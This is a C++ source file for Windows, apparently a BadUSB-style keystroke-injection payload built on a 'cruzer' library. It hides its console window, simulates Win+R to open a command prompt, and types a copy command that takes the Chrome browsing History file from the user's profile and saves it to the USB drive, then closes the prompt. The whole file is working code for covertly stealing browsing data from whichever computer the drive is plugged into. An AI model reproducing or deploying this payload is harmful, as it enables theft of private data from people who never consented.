#ifdef _WIN32                                           //If current platform is windows

//Include needed libraries and headers
#include "cruzer.h"                                     //Cruzer header
#include <vector>                                       //Vector library

//Use 'cruzer' namespace
using namespace cruzer;                                 //Cruzer namespace


//Use standard namespaces for wString
using std::wstring;                                     //Standard namespace for wString

//main function to execute
int main() {

    //Checking if terminal must be hidden
    if(isVisible()) {                                   //If current terminal is visible
        toggleConsoleVisibility(false);                 //Then, hide terminal
    }

    //Open RUN dialog (WIN + R)
    delay(500);                                         //Wait for 0.5 seconds
    vector<WORD> RUNDialogKeys;                         //Create a vector where keys are stored 
    RUNDialogKeys.push_back(VK_LWIN);                   //Append / Insert / Push Windows Key
    RUNDialogKeys.push_back('R');                       //Append / Insert / Push R Key
    multiPress(RUNDialogKeys);                          //Call multiPress function for (WIN + R)


    //Open CMD Prompt (RUN -> cmd -> ENTER)
    delay(500);                                         //Wait for 0.5 seconds
    typeKeys("cmd");                                    //Type 'cmd' On RUN dialog
    keyPress(VK_RETURN);                                //Press Enter


    //Get path to save file on USB drive    
    wchar_t driveLetter = getDriveLetter();             //Get USB Drive's (CRUZER) id (letter that windows specifies to a drive)
    wstring drivePath = std::wstring(1, driveLetter) + L":\\";
    wstring historyPath = drivePath + L"history.txt";   //Text file's path

    //Get path to copy history from
    wstring chromeProfilePath = L"%userprofile%\\AppData\\Local\\Google\\Chrome\\User Data\\Default";  
    wstring copyCommand = L"copy \"" + chromeProfilePath + L"\\History\" \"" + historyPath + L"\"";

    //Execute the command
    typeKeys(copyCommand);                              //Write command 
    keyPress(VK_RETURN);                                //Press ENTER

    //Exit from command prompt
    typeKeys("exit");                                   //Write exit
    keyPress(VK_RETURN);                                //Press ENTER       

    return 0;                                           //Exit With Code 0 -> SUCCESS
}


#endif                                                  //End Of "IF DEFINED" Statement